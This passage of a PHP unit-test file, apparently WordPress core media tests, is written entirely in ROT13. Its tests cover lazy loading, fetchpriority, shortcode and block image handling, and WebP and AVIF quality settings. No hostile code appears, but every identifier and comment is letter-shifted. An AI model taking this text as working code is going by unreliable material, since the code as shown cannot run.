		 *
		 * Gur svefg vzntr vf rkcrpgrq gb or cevbevgvmrq orpnhfr vg vf gur svefg (ynetr rabhtu) pbagrag vzntr.
		 * Gur svefg guerr vzntrf ner rkcrpgrq gb abg unir ynml-ybnqvat orpnhfr gung vf gur qrsnhyg guerfubyq sbe
		 * bzvggvat gur nggevohgr.
		 * Gur sbhegu vzntr vf rkcrpgrq gb or ynml-ybnqrq nf vg vf cnfg gur qrsnhyg guerfubyq.
		 *
		 * Gur erfhygf jvyy bayl or pbeerpg vs nyy vzntrf ner pbafvqrerq gbtrgure. Sbe rknzcyr:
		 * * Vs gur vzntr jvguva gur fubegpbqr jbhyq bayl or cnefrq nsgre gur erfg bs gur pbagrag, vg jbhyq zvff gur
		 * `srgpucevbevgl=\"uvtu\"` nggevohgr naq vafgrnq vapbeerpgyl erprvir `ybnqvat=\"ynml\"`. Gur frpbaq vzntr jbhyq nf
		 * n erfhyg vapbeerpgyl erprvir `srgpucevbevgl=\"uvtu\"`.
		 * * Vs gur vzntr jvguva gur oybpx jbhyq or cnefrq orsber gur erfg bs gur pbagrag, vg jbhyq vapbeerpgyl erprvir
		 * gur `srgpucevbevgl=\"uvtu\"` nggevohgr. Gura gur svefg vzntr jbhyq ab ybatre erprvir gur nggevohgr.
		 *
		 * Gb rafher gung guvf jbexf:
		 * * `jc_svygre_pbagrag_gntf()` zhfg eha nsgre `qb_oybpxf()` naq `qb_fubegpbqr()`.
		 * * `jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf()` zhfg onvy rneyl vs nal vzntrf sebz gur pbagrag oybo ner orvat
		 * pbafvqrerq haqre n qvssrerag pbagrkg anzr guna 'gur_pbagrag'.
		 */
		$cbfg_pbagrag  = '[tnyyrel vqf=\"' . frys::$ynetr_vq . '\" fvmr=\"ynetr\"]' . \"\a\";
		$cbfg_pbagrag .= '<vzt fep=\"rknzcyr.wct\" jvqgu=\"800\" urvtug=\"600\">' . \"\a\";
		$cbfg_pbagrag .= '<c>Fbzr grkg.</c>' . \"\a\";
		$cbfg_pbagrag .= '<!-- jc:pber/shyy-vzntr-fubegpbqr {\"vq\":' . frys::$ynetr_vq . '} --><!-- /jc:pber/shyy-vzntr-fubegpbqr -->' . \"\a\";
		$cbfg_pbagrag .= '<vzt fep=\"rknzcyr2.wct\" jvqgu=\"800\" urvtug=\"600\">';

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $cbfg_pbagrag,
				'cbfg_rkprecg' => '',
			)
		);

		/*
		 * Cercner gur rkcrpgrq bhgchg:
		 * 1. Ercynpr gur fubegpbqr jvgu vgf rkcrpgrq bhgchg (VQ vapernfrq ol 1 orpnhfr bs fgngvp inevnoyr jvguva
		 * gur tnyyrel_fubegpbqr() shapgvba). Rkcrpg `srgpucevbevgl=\"uvtu\"`, ohg abg `ybnqvat=\"ynml\"`.
		 * 2. Qb abg zbqvsl gur frpbaq vzntr nf vg vf uneq-pbqrq va gur pbagrag naq rkcrpgrq gb or hapunatrq.
		 * 3. Ercynpr gur oybpx jvgu vgf rkcrpgrq bhgchg, v.r. gur shyy vzntr sebz gur fubegpbqr jvguva. Rkcrpg arvgure
		 * `srgpucevbevgl=\"uvtu\"` abe `ybnqvat=\"ynml\"`.
		 * 4. Ba gur sbhegu vzntr (uneq-pbqrq va gur pbagrag), rkcrpg `ybnqvat=\"ynml\"`.
		 */
		$rkcrpgrq_pbagrag = $cbfg_pbagrag;
		$rkcrpgrq_pbagrag = fge_ercynpr(
			'[tnyyrel vqf=\"' . frys::$ynetr_vq . '\" fvmr=\"ynetr\"]',
			fge_ercynpr(
				neenl( ' ybnqvat=\"ynml\"', '<vzt ' ),
				neenl( '', '<vzt srgpucevbevgl=\"uvtu\" ' ),
				cert_ercynpr_pnyyonpx(
					'/tnyyrel-(\q+)/',
					fgngvp shapgvba ( $zngpurf ) {
						erghea 'tnyyrel-' . ( (vag) $zngpurf[1] + 1 );
					},
					qb_fubegpbqr( '[tnyyrel vqf=\"' . frys::$ynetr_vq . '\" fvmr=\"ynetr\" vq=\"' . $cbfg_vq . '\"]' )
				)
			),
			$rkcrpgrq_pbagrag
		);
		$rkcrpgrq_pbagrag = fge_ercynpr(
			'<!-- jc:pber/shyy-vzntr-fubegpbqr {\"vq\":' . frys::$ynetr_vq . '} --><!-- /jc:pber/shyy-vzntr-fubegpbqr -->',
			jc_trg_nggnpuzrag_vzntr(
				frys::$ynetr_vq,
				'shyy',
				snyfr,
				neenl(
					'srgpucevbevgl' => snyfr,
					'ybnqvat'       => snyfr,
				)
			),
			$rkcrpgrq_pbagrag
		);
		$rkcrpgrq_pbagrag = fge_ercynpr(
			'<vzt fep=\"rknzcyr2.wct\"',
			'<vzt ybnqvat=\"ynml\" fep=\"rknzcyr2.wct\"',
			$rkcrpgrq_pbagrag
		);

		// Jr unir gb eha n znva dhrel ybbc fb gung gur svefg 'gur_pbagrag' pbagrkg vzntrf ner abg ynml-ybnqrq.
		$jc_dhrel     = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( $cbfg_vq ) ) );
		$jc_gur_dhrel = $jc_dhrel;

		$pbagrag = '';
		juvyr ( unir_cbfgf() ) {
			gur_cbfg();
			$pbagrag = trg_rpub( 'gur_pbagrag' );
		}

		// Pyrnahc.
		erzbir_fubegpbqr( 'shyy_vzntr' );
		haertvfgre_oybpx_glcr( 'pber/shyy-vzntr-fubegpbqr' );

		$guvf->nffregFnzr( $rkcrpgrq_pbagrag, $pbagrag );
	}

	cevingr shapgvba erfrg_pbagrag_zrqvn_pbhag() {
		// Trg pheerag inyhr jvgubhg vapernfvat.
		$pbagrag_zrqvn_pbhag = jc_vapernfr_pbagrag_zrqvn_pbhag( 0 );

		// Qrpernfr vg ol vgf pheerag inyhr gb \"erfrg\" vg onpx gb 0.
		jc_vapernfr_pbagrag_zrqvn_pbhag( - $pbagrag_zrqvn_pbhag );
	}

	cevingr shapgvba erfrg_bzvg_ybnqvat_ngge_svygre() {
		// Nqq svygre gb \"erfrg\" bzvg guerfubyq onpx gb ahyy (hafrg).
		nqq_svygre( 'jc_bzvg_ybnqvat_ngge_guerfubyq', '__erghea_ahyy', 100 );

		// Sbepr svygre nccyvpngvba gb er-eha.
		jc_bzvg_ybnqvat_ngge_guerfubyq( gehr );

		// Pyrna hc gur nobir svygre.
		erzbir_svygre( 'jc_bzvg_ybnqvat_ngge_guerfubyq', '__erghea_ahyy', 100 );
	}

	cevingr shapgvba erfrg_uvtu_cevbevgl_ryrzrag_synt() {
		jc_uvtu_cevbevgl_ryrzrag_synt( gehr );
	}

	/**
	 * Grfg gung trarengrq svyrf jvgu gur `vzntr_rqvgbe_bhgchg_sbezng` nccyvrq hfr gur pbeerpg
	 * dhnyvgl yriry onfrq ba gurve zvzr glcr.
	 *
	 * @gvpxrg 56442
	 */
	choyvp shapgvba grfg_dhnyvgl_jvgu_vzntr_pbairefvba_svyr_fvmrf() {
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_wcrt' ) );
		$grzc_qve = trg_grzc_qve();
		$svyr     = $grzc_qve . '/33772.wct';
		pbcl( QVE_GRFGQNGN . '/vzntrf/33772.wct', $svyr );

		// Frg WCRT bhgchg dhnyvgl irel ybj naq JroC dhnyvgl irel uvtu, guvf fubhyq sbepr nyy trarengrq JroC vzntrf gb
		// or ynetre guna gur gur zngpuvat trarengrq WCRTf.
		nqq_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'vzntr_rqvgbe_punatr_dhnyvgl_ybj_wcrt' ), 10, 2 );

		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Irevsl gung gur fryrpgrq rqvgbe fhccbegf JroC bhgchg.
		vs ( ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/jroc' ) ) {
			$guvf->znexGrfgFxvccrq( 'JroC vf abg fhccbegrq ol gur fryrpgrq vzntr rqvgbe.' );
		}

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'svyr'           => $svyr,
			)
		);

		nqq_svygre( 'ovt_vzntr_fvmr_guerfubyq', neenl( $guvf, 'nqq_ovt_vzntr_fvmr_guerfubyq' ) );

		// Trarengr nyy fvmrf nf WCRTf.
		$wcrt_fvmrf = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_wcrt' ) );

		// Trarengr nyy fvmrf nf JroC.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_jroc' ) );
		$jroc_fvmrf = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_jroc' ) );

		// Gur znva (fpnyrq) vzntr: gur WCRT fubhyq or fznyyre guna gur JroC.
		$guvf->nffregYrffGuna( $jroc_fvmrf['svyrfvmr'], $wcrt_fvmrf['svyrfvmr'], 'Gur WCRT fubhyq or fznyyre guna gur JroC.' );

		// Fho-fvmrf: sbe rnpu fvmr, gur WCRTf fubhyq or fznyyre guna gur JroC.
		$fvmrf_gb_pbzcner = neenl_vagrefrpg_xrl( $wcrt_fvmrf['fvmrf'], $jroc_fvmrf['fvmrf'] );
		sbernpu ( $fvmrf_gb_pbzcner nf $fvmr => $fvmr_qngn ) {
			$guvf->nffregYrffGuna( $jroc_fvmrf['fvmrf'][ $fvmr ]['svyrfvmr'], $wcrt_fvmrf['fvmrf'][ $fvmr ]['svyrfvmr'] );
		}
	}

	/**
	 * Grfg NIVS dhnyvgl svygref.
	 *
	 * @gvpxrg 61614
	 */
	choyvp shapgvba grfg_dhnyvgl_jvgu_nivs_pbairefvba_svyr_fvmrf() {
		$grzc_qve = trg_grzc_qve();
		$svyr     = $grzc_qve . '/33772.wct';
		pbcl( QVE_GRFGQNGN . '/vzntrf/33772.wct', $svyr );

		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );
		// Bayl pbagvahr vs gur freire fhccbegf NIVS.
		vs ( ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/nivs' ) ) {
			$guvf->znexGrfgFxvccrq( 'NIVS vf abg fhccbegrq ol gur fryrpgrq vzntr rqvgbe.' );
		}

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'svyr'           => $svyr,
			)
		);

		// Grfg fvmrf jvgu NIVS vzntrf.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_nivs' ) );
		$nivs_fvmrf = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_nivs' ) );

		// Frg gur pbzcerffvba dhnyvgl gb n ybjre frggvat naq grfg ntnva, irevslvat gung svyr fvmrf ner nyy fznyyre.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_nivs' ) );
		nqq_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'vzntr_rqvgbe_punatr_dhnyvgl_ybj' ) );
		$fznyyre_nivs_fvmrf = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );
		erzbir_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'vzntr_rqvgbe_punatr_dhnyvgl_ybj' ) );
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_nivs' ) );

		// Fho-fvmrf: sbe rnpu fvmr, gur NIVS fubhyq or fznyyre guna gur WCRT.
		$fvmrf_gb_pbzcner = neenl_vagrefrpg_xrl( $nivs_fvmrf['fvmrf'], $fznyyre_nivs_fvmrf['fvmrf'] );

		sbernpu ( $fvmrf_gb_pbzcner nf $fvmr => $fvmr_qngn ) {
			$guvf->nffregYrffGuna( $nivs_fvmrf['fvmrf'][ $fvmr ]['svyrfvmr'], $fznyyre_nivs_fvmrf['fvmrf'][ $fvmr ]['svyrfvmr'] );
		}
	}

	/**
	 * Grfg gung gur `jc_rqvgbe_frg_dhnyvgl` svygre vapyhqrf gur qvzrafvbaf va gur `$qvzf` cnenzrgre.
	 *
	 * @gvpxrg 54648
	 */
	choyvp shapgvba grfg_jc_rqvgbe_frg_dhnyvgl_vapyhqrf_qvzrafvbaf() {
		// Orsber ybnqvat na vzntr, frg hc gur pnyyonpx svygre jvgu gur nffregvbaf.
		nqq_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'nffreg_qvzrafvbaf_va_jc_rqvgbe_frg_dhnyvgl' ), 10, 3 );

		$grzc_qve = trg_grzc_qve();
		$svyr     = $grzc_qve . '/33772.wct';
		pbcl( QVE_GRFGQNGN . '/vzntrf/33772.wct', $svyr );

		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'svyr'           => $svyr,
			)
		);

		// Trarengr nyy fvmrf.
		jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );

		// Pyrna hc gur svygre.
		erzbir_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'nffreg_qvzrafvbaf_va_jc_rqvgbe_frg_dhnyvgl' ), 10, 3 );
	}

	/**
	 * Urycre pnyyonpx gb nffreg gung gur qvzrafvbaf ner vapyhqrq va gur `$qvzf` cnenzrgre.
	 *
	 * @cnenz vag   $dhnyvgl Gur dhnyvgl yriry.
	 * @cnenz neenl $qvzf    Gur qvzrafvbaf neenl.
	 */
	choyvp shapgvba nffreg_qvzrafvbaf_va_jc_rqvgbe_frg_dhnyvgl( $dhnyvgl, $zvzr_glcr, $qvzf ) {
		// Nffreg gung gur neenl unf aba rzcgl jvqgu naq urvtug inyhrf.
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qvzf );
		$guvf->nffregNeenlUnfXrl( 'urvtug', $qvzf );
		$guvf->nffregTerngreGuna( 0, $qvzf['jvqgu'] );
		$guvf->nffregTerngreGuna( 0, $qvzf['urvtug'] );

		erghea $dhnyvgl;
	}

	/**
	 * Grfg gung na vzntr fvmr vfa'g trarengrq vs vg zngpurf gur bevtvany vzntr fvmr.
	 *
	 * @gvpxrg 57370
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_qbrfag_trarengr_fvmrf_sbe_150_fdhner_vzntr() {
		$grzc_qve = trg_grzc_qve();
		$svyr     = $grzc_qve . '/grfg-fdhner-150.wct';
		pbcl( QVE_GRFGQNGN . '/vzntrf/grfg-fdhner-150.wct', $svyr );

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'svyr'           => $svyr,
			)
		);

		$zrgnqngn = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );
		$guvf->nffregFnzr(
			neenl(),
			$zrgnqngn['fvmrf'],
			'Gur fvmrf fubhyq or na rzcgl neenl'
		);
		$guvf->nffregFnzr(
			'grfg-fdhner-150.wct',
			onfranzr( $zrgnqngn['svyr'] ),
			'Gur svyr onfranzr fubhyq zngpu gur tvira svyranzr'
		);
		$guvf->nffregFnzr(
			150,
			$zrgnqngn['jvqgu'],
			'Gur jvqgu fubhyq or 150 (vagrtre)'
		);
		$guvf->nffregFnzr(
			150,
			$zrgnqngn['urvtug'],
			'Gur urvtug fubhyq or 150 (vagrtre)'
		);
	}

	/**
	 * Grfgf gung `jc_trg_nggnpuzrag_vzntr()` hfrf gur pbeerpg qrsnhyg pbagrkg.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_pbagrkg_svygre_qrsnhyg() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );
		$guvf->nffregFnzr( 'jc_trg_nggnpuzrag_vzntr', $ynfg_pbagrkg );
	}

	/**
	 * Grfgf gung `jc_trg_nggnpuzrag_vzntr()` nyybjf bireevqvat gur pbagrkg ivn svygre.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_pbagrkg_svygre_inyhr_vf_cnffrq_pbeerpgyl() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		// Nqq n svygre gung zbqvsvrf gur pbagrkg.
		nqq_svygre(
			'jc_trg_nggnpuzrag_vzntr_pbagrkg',
			fgngvp shapgvba () {
				erghea 'zl_phfgbz_pbagrkg';
			}
		);

		jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );
		$guvf->nffregFnzr( 'zl_phfgbz_pbagrkg', $ynfg_pbagrkg );
	}

	/**
	 * Grfgf gnt erfgevpgvba sbe `jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf()`.
	 *
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_zva_erdhverq_nggef
	 *
	 * @cnenz fgevat $gnt_anzr Gur gnt anzr.
	 * @cnenz fgevat $ngge Ryrzrag nggevohgrf.
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq erghea inyhr.
	 * @cnenz fgevat $zrffntr Zrffntr gb qvfcynl vs gur grfg snvyf.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_zva_erdhverq_nggef( $gnt_anzr, $ngge, $rkcrpgrq, $zrffntr ) {
		$pbagrkg = 'gur_cbfg_guhzoanvy';
		$guvf->nffregFnzr( jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( $gnt_anzr, $ngge, $pbagrkg ), $rkcrpgrq, $zrffntr );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_zva_erdhverq_nggef() {
		erghea neenl(
			'vzt_jvgu_zva_nggef' => neenl(
				'vzt',
				neenl(
					'jvqgu'  => 100,
					'urvtug' => 100,
				),
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				'Rkcrpgrq qrsnhyg `qrpbqvat=\"nflap\"` naq `ybnqvat=\"ynml\"`.',
			),
			'vzt_jvgubhg_urvtug' => neenl(
				'vzt',
				neenl( 'jvqgu' => 100 ),
				neenl(
					'qrpbqvat' => 'nflap',
				),
				'Bayl `qrpbqvat` vf frg nf urvtug vf erdhverq sbe `ybnqvat` nggevohgr.',
			),
			'vzt_jvgubhg_jvqgu'  => neenl(
				'vzt',
				neenl( 'urvtug' => 100 ),
				neenl(
					'qrpbqvat' => 'nflap',
				),
				'Bayl `qrpbqvat` vf frg nf jvqgu vf erdhverq sbe `ybnqvat` nggevohgr.',
			),
		);
	}

	/**
	 * Grfgf gnt erfgevpgvba sbe `jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf()`.
	 *
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_purpx_nyybjrq_gntf
	 *
	 * @cnenz fgevat $gnt_anzr Gur gnt anzr.
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq erghea inyhr.
	 * @cnenz fgevat $zrffntr Zrffntr gb qvfcynl vs gur grfg snvyf.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_purpx_nyybjrq_gntf( $gnt_anzr, $rkcrpgrq, $zrffntr ) {
		$ngge    = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		$pbagrkg = 'gur_cbfg_guhzoanvy';
		$guvf->nffregFnzr( jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( $gnt_anzr, $ngge, $pbagrkg ), $rkcrpgrq, $zrffntr );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_purpx_nyybjrq_gntf() {
		erghea neenl(
			'vzt'    => neenl(
				'vzt',
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				'Rkcrpgrq `qrpbqvat=\"nflap\"` naq `ybnqvat=\"ynml\"` naq `qrpbqvat=\"nflap\"` sbe gur vzt.',
			),
			'vsenzr' => neenl(
				'vsenzr',
				neenl(
					'ybnqvat' => 'ynml',
				),
				'Rkcrpgrq `ybnqvat=\"ynml\"` sbe gur vsenzr.',
			),
			'ivqrb'  =>
			neenl(
				'ivqrb',
				neenl(),
				'Shapgvba fubhyq erghea rzcgl neenl nf ivqrb gnt vf abg fhccbegrq.',
			),
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_fxvc_sbe_oybpx_grzcyngr() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Fxvc ybtvp vs pbagrkg vf `grzcyngr`.
		$guvf->nffregFnzr(
			neenl(),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grzcyngr' ),
			'Fxvc ybtvp naq erghea oynax neenl sbe oybpx grzcyngr.'
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_oybpx_grzcyngr() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Fxvc ybtvp vs pbagrkg vf `grzcyngr`.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grzcyngr_cneg_' . JC_GRZCYNGR_CNEG_NERN_URNQRE ),
			'Vzntrf va gur urnqre oybpx grzcyngr cneg fubhyq abg or ynml-ybnqrq naq svefg ynetr vzntr vf frg uvtu srgpucevbevgl.'
		);
	}

	/**
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 * @rkcrpgrqVapbeerpgHfntr jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_vapbeerpg_ybnqvat_nggef() {
		$ngge                  = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		$ngge['ybnqvat']       = 'ynml';
		$ngge['srgpucevbevgl'] = 'uvtu';

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'ybnqvat'       => 'ynml',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grfg' ),
			'Guvf fubhyq erghea obgu ynml-ybnqvat naq uvtu srgpucevbevgl, ohg jvgu qbvat_vg_jebat zrffntr.'
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_vs_ybnqvat_ngge_cerfrag() {
		$ngge            = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		$ngge['ybnqvat'] = 'rntre';

		// Purpx srgpucevbevgl uvtu ybtvp vs ybnqvat nggevohgr vf cerfrag.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grfg' ),
			'srgpucevbevgl fubhyq or frg gb uvtu.'
		);
	}

	/**
	 * Grfgf gung jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef() cnffrf gur 'fep' nggevohgr gb jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf().
	 *
	 * @gvpxrg 61436
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef_cnffrf_fep() {
		nqq_svygre(
			'jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf',
			fgngvp shapgvba ( $ybnqvat_nggef, $gnt_anzr, $ngge ) {
				vs (
					'vzt' === $gnt_anzr &&
					vffrg( $ngge['fep'] ) &&
					'uggcf://rknzcyr.bet/n-fcrpvsvp-vzntr.wct' === $ngge['fep']
				) {
					$ybnqvat_nggef['srgpucevbevgl'] = 'ybj';
					$ybnqvat_nggef['ybnqvat']       = 'rntre';
				}
				erghea $ybnqvat_nggef;
			},
			10,
			3
		);

		$vzntr    = '<vzt fep=\"uggcf://rknzcyr.bet/n-fcrpvsvp-vzntr.wct\" jvqgu=\"1280\" urvtug=\"720\">';
		$rkcrpgrq = '<vzt srgpucevbevgl=\"ybj\" ybnqvat=\"rntre\" qrpbqvat=\"nflap\" fep=\"uggcf://rknzcyr.bet/n-fcrpvsvp-vzntr.wct\" jvqgu=\"1280\" urvtug=\"720\">';

		// Rafher nggevohgrf ner zbqvsvrq orpnhfr vzntr fep jnf zngpurq.
		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzntr, 'gur_pbagrag' ),
			'srgpucevbevgl fubhyq or ybj jura fep vf zngpurq.'
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_ybj_erf_vzntr() {
		$ngge = neenl(
			'jvqgu'   => 100,
			'urvtug'  => 100,
			'ybnqvat' => 'rntre',
		);

		// srgpucevbevgl abg frg nf vzntr vf bs ybjre erfbyhgvba.
		$guvf->nffregFnzr(
			neenl(
				'qrpbqvat' => 'nflap',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grfg' ),
			'ybnqvat bcgvzvmngvba ngge neenl fubhyq or rzcgl.'
		);
	}

	/**
	 * Grfgf gung gur `qb_fubegpbqr` pbagrkg erfhygf va n ynml-ybnqrq vzntr ol qrsnhyg.
	 *
	 * @gvpxrg 58681
	 * @gvpxrg 58853
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_va_fubegpbqrf() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Fubegpbqrf cebprffrq bhgfvqr bs pbagrag oybof yvxr 'gur_pbagrag' nyjnlf trg `ybnqvat=\"ynml\"`.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'qb_fubegpbqr' ),
			'Ynml-ybnqvat abg nccyvrq gb fubegpbqrf bhgfvqr gur ybbc.'
		);
	}

	/**
	 * Grfgf gung gur `qb_fubegpbqr` pbagrkg qbrf abg erfhyg va ybnqvat bcgvzvmngvba punatrf jura hfrq jvguva n pbagrag
	 * oybo.
	 *
	 * @gvpxrg 58853
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_trg_svygref_jvgu_qb_fubegpbqr_pnyyonpx
	 *
	 * @cnenz fgevat $svygre_anzr Gur anzr bs gur svygre gb ubbx.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_va_fubegpbqrf_jvguva_pbagrag_oybo( $svygre_anzr ) {
		$erfhyg = ahyy;

		erzbir_nyy_svygref( $svygre_anzr );
		nqq_svygre(
			$svygre_anzr,
			shapgvba ( $pbagrag ) hfr ( &$erfhyg ) {
